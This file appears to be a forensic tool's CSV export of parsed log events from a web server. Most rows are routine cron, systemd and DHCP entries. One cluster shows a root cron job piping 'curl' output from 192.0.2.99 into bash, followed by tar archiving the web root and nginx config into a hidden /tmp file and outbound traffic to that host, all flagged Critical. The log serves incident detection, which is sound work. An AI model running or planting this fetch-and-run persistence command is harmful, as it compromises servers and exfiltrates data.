event_id,investigation_id,evidence_file_id,line_number,timestamp,hostname,process,process_id,event_type,event_category,username,target_username,source_ip,source_port,authentication_method,command,result,raw_message,classification,severity,confidence,matched_rule_ids,parsing_error,created_at
event-f5aaedb66704,inv-6d8cf13d7b5a,file-097ff055b132,21,2026-03-09T11:38:00,webserver01,CRON,4106,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet --no-self-upgrade,success,(root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade),Normal,Informational,0.5,[],,2026-08-04T07:21:52.075034
event-a7b056435fd3,inv-6d8cf13d7b5a,file-097ff055b132,22,2026-03-09T11:45:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 875 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.075192
event-21b63fff3232,inv-6d8cf13d7b5a,file-097ff055b132,23,2026-03-09T11:59:00,webserver01,CRON,4117,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.075312
event-641272410844,inv-6d8cf13d7b5a,file-097ff055b132,24,2026-03-09T12:16:00,webserver01,CRON,4128,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.075467
event-4f51bb74fe98,inv-6d8cf13d7b5a,file-097ff055b132,25,2026-03-09T12:22:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 908 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.075635
event-0bf543afcb25,inv-6d8cf13d7b5a,file-097ff055b132,26,2026-03-09T12:36:00,webserver01,CRON,4144,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet --no-self-upgrade,success,(root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade),Normal,Informational,0.5,[],,2026-08-04T07:21:52.075758
event-449aa7507b5e,inv-6d8cf13d7b5a,file-097ff055b132,27,2026-03-09T12:59:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Reloaded A high performance web server and a reverse proxy server.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.075929
event-9d9bbc559447,inv-6d8cf13d7b5a,file-097ff055b132,28,2026-03-09T13:05:00,webserver01,kernel,,unparsed,unknown,,,,,,,,"[597128.813] eth0: renewed DHCP lease, IP 10.0.0.15",Unknown,Informational,0.5,[],,2026-08-04T07:21:52.076072
event-bcc0d440c1b5,inv-6d8cf13d7b5a,file-097ff055b132,29,2026-03-09T13:30:00,webserver01,CRON,4162,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.076210
event-9d05b7204dd2,inv-6d8cf13d7b5a,file-097ff055b132,30,2026-03-09T13:54:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 941 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.076372
event-9837895fe1e6,inv-6d8cf13d7b5a,file-097ff055b132,31,2026-03-09T14:12:00,webserver01,CRON,4180,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet --no-self-upgrade,success,(root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade),Normal,Informational,0.5,[],,2026-08-04T07:21:52.076493
event-468ad34afec5,inv-6d8cf13d7b5a,file-097ff055b132,32,2026-03-09T14:37:00,webserver01,CRON,4188,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet --no-self-upgrade,success,(root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade),Normal,Informational,0.5,[],,2026-08-04T07:21:52.076658
event-f02ecaf76b7c,inv-6d8cf13d7b5a,file-097ff055b132,33,2026-03-09T14:52:00,webserver01,CRON,4190,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.076814
event-1313cdf7217e,inv-6d8cf13d7b5a,file-097ff055b132,34,2026-03-09T15:11:00,webserver01,CRON,4195,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.076978
event-5fe3d0b94666,inv-6d8cf13d7b5a,file-097ff055b132,35,2026-03-09T15:19:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 500 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.077132
event-b344fe0258d0,inv-6d8cf13d7b5a,file-097ff055b132,36,2026-03-09T15:38:00,webserver01,CRON,4210,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.077260
event-e9cacf1eef48,inv-6d8cf13d7b5a,file-097ff055b132,37,2026-03-09T15:54:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 938 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.077418
event-991469f4147e,inv-6d8cf13d7b5a,file-097ff055b132,38,2026-03-09T16:11:00,webserver01,kernel,,unparsed,unknown,,,,,,,,"[840710.525] eth0: renewed DHCP lease, IP 10.0.0.15",Unknown,Informational,0.5,[],,2026-08-04T07:21:52.077535
event-751fecffc7ff,inv-6d8cf13d7b5a,file-097ff055b132,39,2026-03-09T16:26:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 336 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.077670
event-67e7d53da3aa,inv-6d8cf13d7b5a,file-097ff055b132,40,2026-03-09T16:34:00,webserver01,CRON,4228,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.077791
event-92651205d90e,inv-6d8cf13d7b5a,file-097ff055b132,41,2026-03-09T16:45:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 596 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.077954
event-e9696190c661,inv-6d8cf13d7b5a,file-097ff055b132,42,2026-03-09T17:07:00,webserver01,CRON,4234,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.078074
event-6bbb09d54c01,inv-6d8cf13d7b5a,file-097ff055b132,43,2026-03-09T17:11:00,webserver01,CRON,4243,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.078232
event-51e6dd227819,inv-6d8cf13d7b5a,file-097ff055b132,44,2026-03-09T17:26:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 228 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.078385
event-3f895c7c5c82,inv-6d8cf13d7b5a,file-097ff055b132,45,2026-03-09T17:46:00,webserver01,kernel,,unparsed,unknown,,,,,,,,"[809047.857] eth0: renewed DHCP lease, IP 10.0.0.15",Unknown,Informational,0.5,[],,2026-08-04T07:21:52.078512
event-16768ca8e3e1,inv-6d8cf13d7b5a,file-097ff055b132,46,2026-03-10T03:20:04,webserver01,CRON,4406,cron_execution,persistence,,,,,,curl -s http://192.0.2.99/update.sh | bash,success,(root) CMD (curl -s http://192.0.2.99/update.sh | bash),Critical,High,0.5,['PERSIST-002'],,2026-08-04T07:21:52.078651
event-477c4905e91a,inv-6d8cf13d7b5a,file-097ff055b132,47,2026-03-10T03:20:05,webserver01,kernel,,unparsed,unknown,,,,,,,,[482348.182] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=60 PROTO=TCP SPT=47224 DPT=443 SYN,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.078824
event-a6f201649ee0,inv-6d8cf13d7b5a,file-097ff055b132,48,2026-03-10T03:23:10,webserver01,audit,,unparsed,unknown,,,,,,,,"EXECVE argc=5 a0=""/bin/tar"" a1=""czf"" a2=""/tmp/.cache_bkp.tar.gz"" a3=""/var/www/html"" a4=""/etc/nginx""",Unknown,Informational,0.5,[],,2026-08-04T07:21:52.078987
event-3eba7b6bebb0,inv-6d8cf13d7b5a,file-097ff055b132,49,2026-03-10T03:23:40,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session c1031 of user root.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.079165
event-f6c2b0b89b45,inv-6d8cf13d7b5a,file-097ff055b132,50,2026-03-10T03:23:55,webserver01,kernel,,unparsed,unknown,,,,,,,,[602764.768] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=1420 PROTO=TCP SPT=51272 DPT=443 ACK PSH,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.079282
event-26b3f0c3e364,inv-6d8cf13d7b5a,file-097ff055b132,51,2026-03-10T03:23:58,webserver01,kernel,,unparsed,unknown,,,,,,,,[938487.758] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=1420 PROTO=TCP SPT=42778 DPT=443 ACK PSH,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.079454
event-4712e00be727,inv-6d8cf13d7b5a,file-097ff055b132,52,2026-03-10T03:24:00,webserver01,kernel,,unparsed,unknown,,,,,,,,[975192.776] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=980 PROTO=TCP SPT=43929 DPT=443 ACK FIN,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.079629
event-a8218e1da797,inv-6d8cf13d7b5a,file-097ff055b132,53,2026-03-10T03:30:06,webserver01,CRON,4408,cron_execution,persistence,,,,,,curl -s http://192.0.2.99/update.sh | bash,success,(root) CMD (curl -s http://192.0.2.99/update.sh | bash),Critical,High,0.5,['PERSIST-002'],,2026-08-04T07:21:52.079808
event-bbf6a335079f,inv-6d8cf13d7b5a,file-097ff055b132,54,2026-03-10T03:30:07,webserver01,kernel,,unparsed,unknown,,,,,,,,[337865.581] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=60 PROTO=TCP SPT=46445 DPT=443 SYN,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.079967
event-922969232a32,inv-6d8cf13d7b5a,file-097ff055b132,55,2026-03-10T03:40:11,webserver01,CRON,4414,cron_execution,persistence,,,,,,curl -s http://192.0.2.99/update.sh | bash,success,(root) CMD (curl -s http://192.0.2.99/update.sh | bash),Critical,High,0.5,['PERSIST-002'],,2026-08-04T07:21:52.080134
event-62519ffddaa1,inv-6d8cf13d7b5a,file-097ff055b132,56,2026-03-10T03:40:12,webserver01,kernel,,unparsed,unknown,,,,,,,,[314301.594] IPTABLES-OUT: IN= OUT=eth0 SRC=10.0.0.15 DST=192.0.2.99 LEN=60 PROTO=TCP SPT=60449 DPT=443 SYN,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.080295
event-819713390c05,inv-6d8cf13d7b5a,file-097ff055b132,57,2026-03-10T07:05:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Reloaded A high performance web server and a reverse proxy server.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.080463
event-8ef1616db859,inv-6d8cf13d7b5a,file-097ff055b132,58,2026-03-10T07:26:00,webserver01,CRON,4278,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet --no-self-upgrade,success,(root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade),Normal,Informational,0.5,[],,2026-08-04T07:21:52.080630
event-db987568b79c,inv-6d8cf13d7b5a,file-097ff055b132,59,2026-03-10T07:42:00,webserver01,CRON,4289,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.080981
event-8b04370d2614,inv-6d8cf13d7b5a,file-097ff055b132,60,2026-03-10T07:58:00,webserver01,CRON,4291,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.081186
event-4d4fc2b7baf5,inv-6d8cf13d7b5a,file-097ff055b132,61,2026-03-10T08:08:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Reloaded A high performance web server and a reverse proxy server.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.081360
event-4e574056a870,inv-6d8cf13d7b5a,file-097ff055b132,62,2026-03-10T08:22:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 100 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.081509
event-234783549bdf,inv-6d8cf13d7b5a,file-097ff055b132,63,2026-03-10T08:44:00,webserver01,CRON,4297,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.081664
event-daa85c701a03,inv-6d8cf13d7b5a,file-097ff055b132,64,2026-03-10T08:59:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 995 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.081884
event-109bc0fc67f8,inv-6d8cf13d7b5a,file-097ff055b132,65,2026-03-10T09:09:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 749 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.082011
event-8a35b0fafc10,inv-6d8cf13d7b5a,file-097ff055b132,66,2026-03-10T09:21:00,webserver01,kernel,,unparsed,unknown,,,,,,,,"[481853.585] eth0: renewed DHCP lease, IP 10.0.0.15",Unknown,Informational,0.5,[],,2026-08-04T07:21:52.082138
event-cca1993b78df,inv-6d8cf13d7b5a,file-097ff055b132,67,2026-03-10T09:28:00,webserver01,CRON,4320,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.082269
event-e796608afb93,inv-6d8cf13d7b5a,file-097ff055b132,68,2026-03-10T09:46:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Reloaded A high performance web server and a reverse proxy server.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.082427
event-1fcfaf374277,inv-6d8cf13d7b5a,file-097ff055b132,69,2026-03-10T09:52:00,webserver01,CRON,4331,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.082591
event-2e722a323501,inv-6d8cf13d7b5a,file-097ff055b132,70,2026-03-10T10:04:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Reloaded A high performance web server and a reverse proxy server.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.082755
event-1fa937021b9a,inv-6d8cf13d7b5a,file-097ff055b132,71,2026-03-10T10:24:00,webserver01,CRON,4343,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.082893
event-e24eb59ae686,inv-6d8cf13d7b5a,file-097ff055b132,72,2026-03-10T10:39:00,webserver01,CRON,4352,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.083052
event-1383f513ed67,inv-6d8cf13d7b5a,file-097ff055b132,73,2026-03-10T10:43:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 758 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.083209
event-1f87ddfb3bf2,inv-6d8cf13d7b5a,file-097ff055b132,74,2026-03-10T10:49:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 630 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.083331
event-cabcea59f1af,inv-6d8cf13d7b5a,file-097ff055b132,75,2026-03-10T11:04:00,webserver01,kernel,,unparsed,unknown,,,,,,,,"[909435.328] eth0: renewed DHCP lease, IP 10.0.0.15",Unknown,Informational,0.5,[],,2026-08-04T07:21:52.083451
event-750bb6846459,inv-6d8cf13d7b5a,file-097ff055b132,76,2026-03-10T11:25:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 437 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.083577
event-f29c934ad6d9,inv-6d8cf13d7b5a,file-097ff055b132,77,2026-03-10T11:49:00,webserver01,CRON,4381,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.083703
event-4fa426d56443,inv-6d8cf13d7b5a,file-097ff055b132,78,2026-03-10T12:00:00,webserver01,kernel,,unparsed,unknown,,,,,,,,"[309629.630] eth0: renewed DHCP lease, IP 10.0.0.15",Unknown,Informational,0.5,[],,2026-08-04T07:21:52.083860
event-36a9ace4e847,inv-6d8cf13d7b5a,file-097ff055b132,79,2026-03-10T12:19:00,webserver01,CRON,4386,cron_execution,persistence,,,,,,/usr/bin/certbot renew --quiet --no-self-upgrade,success,(root) CMD (/usr/bin/certbot renew --quiet --no-self-upgrade),Normal,Informational,0.5,[],,2026-08-04T07:21:52.083989
event-54c59b0bb7c8,inv-6d8cf13d7b5a,file-097ff055b132,80,2026-03-10T12:23:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 365 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.084155
event-c3f10361267c,inv-6d8cf13d7b5a,file-097ff055b132,81,2026-03-10T12:33:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 557 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.084276
event-12edcd96f167,inv-6d8cf13d7b5a,file-097ff055b132,82,2026-03-10T13:16:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 589 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.084393
event-0ef96c2cfe02,inv-6d8cf13d7b5a,file-097ff055b132,83,2026-03-10T13:25:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Reloaded A high performance web server and a reverse proxy server.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.084512
event-7938fc4b8775,inv-6d8cf13d7b5a,file-097ff055b132,84,2026-03-10T13:39:00,webserver01,CRON,4446,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.084649
event-4028109558b0,inv-6d8cf13d7b5a,file-097ff055b132,85,2026-03-10T13:57:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Reloaded A high performance web server and a reverse proxy server.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.084802
event-767e95779065,inv-6d8cf13d7b5a,file-097ff055b132,86,2026-03-10T14:06:00,webserver01,CRON,4451,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.084937
event-3d41adcec5c7,inv-6d8cf13d7b5a,file-097ff055b132,87,2026-03-10T14:10:00,webserver01,CRON,4459,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.085181
event-ed34bf986bbf,inv-6d8cf13d7b5a,file-097ff055b132,88,2026-03-10T14:34:00,webserver01,CRON,4469,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.085347
event-fead4620c684,inv-6d8cf13d7b5a,file-097ff055b132,89,2026-03-10T14:53:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 259 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.085505
event-917b0ff8df4c,inv-6d8cf13d7b5a,file-097ff055b132,90,2026-03-10T15:14:00,webserver01,systemd,1,unparsed,unknown,,,,,,,,Started Session 114 of user deploy.,Unknown,Informational,0.5,[],,2026-08-04T07:21:52.085630
event-2386c109fb93,inv-6d8cf13d7b5a,file-097ff055b132,91,2026-03-10T15:38:00,webserver01,CRON,4479,cron_execution,persistence,,,,,,/usr/sbin/logrotate /etc/logrotate.conf,success,(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf),Normal,Informational,0.5,[],,2026-08-04T07:21:52.085749
event-82c570c54383,inv-6d8cf13d7b5a,file-097ff055b132,92,2026-03-10T15:55:00,webserver01,kernel,,unparsed,unknown,,,,,,,,"[966286.994] eth0: renewed DHCP lease, IP 10.0.0.15",Unknown,Informational,0.5,[],,2026-08-04T07:21:52.085916
